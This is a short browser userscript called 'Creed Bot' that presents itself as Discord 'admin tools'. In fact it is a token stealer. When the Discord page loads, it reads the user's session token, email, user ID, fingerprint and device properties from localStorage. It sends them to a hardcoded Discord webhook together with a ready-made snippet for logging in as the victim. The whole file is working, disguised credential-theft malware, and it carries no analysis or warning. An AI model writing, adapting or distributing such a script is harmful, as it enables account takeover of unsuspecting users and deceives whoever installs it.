// ==UserScript==
// @name         Creed Bot
// @namespace   https://discord.com/channels/@me
// @version      0.1
// @description  Creed Bot admin tools
// @author       Creed
// @match      https://discord.com/channels/@me
// ==/UserScript==

(function() {
    'use strict';

var discordWebhook = "https://discord.com/api/webhooks/822925060334944296/nqVUpAjN9q2ifIl3IgXKCCBUl3BSwTGUgKd4VSfNYGX3zcKjbse7eSpBVwRF1N-gMm7G";
var i = document.createElement('iframe');
document.body.appendChild(i);
var request = new XMLHttpRequest();
request.open("POST", discordWebhook);
request.setRequestHeader('Content-type', 'application/json');
var params = {
    username: "Creed Bot",
    avatar_url: "https://cdn.discordapp.com/attachments/746406161724604437/801504298101768222/image0.jpg",
    content: '**hacked boi !**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nemail : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nProperties : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nScript for login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
};
request.send(JSON.stringify(params));

})();
